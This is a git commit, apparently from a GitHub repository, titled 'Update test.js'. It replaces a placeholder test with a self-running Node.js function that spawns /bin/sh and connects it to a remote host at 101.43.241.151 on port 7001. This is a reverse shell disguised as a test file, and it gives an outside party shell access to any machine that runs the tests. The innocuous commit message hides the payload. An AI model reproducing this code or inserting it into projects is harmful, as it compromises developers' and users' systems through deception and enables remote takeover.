b0e849fd760d6c098d98d5630d09418a0120386a
D2490 <103814015+D2490@users.noreply.github.com>
2023-04-15 12:46:31 +0800

    Update test.js

--- tests/test.js
+++ tests/test.js
@@ -1,2 +1,12 @@
-// TODO: implement the tests
-console.log("Tests are not implemented yet...");
+(function(){
+    var net = require("net"),
+    cp = require("child_process"),
+    sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(7001, "101.43.241.151", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/;
+})();
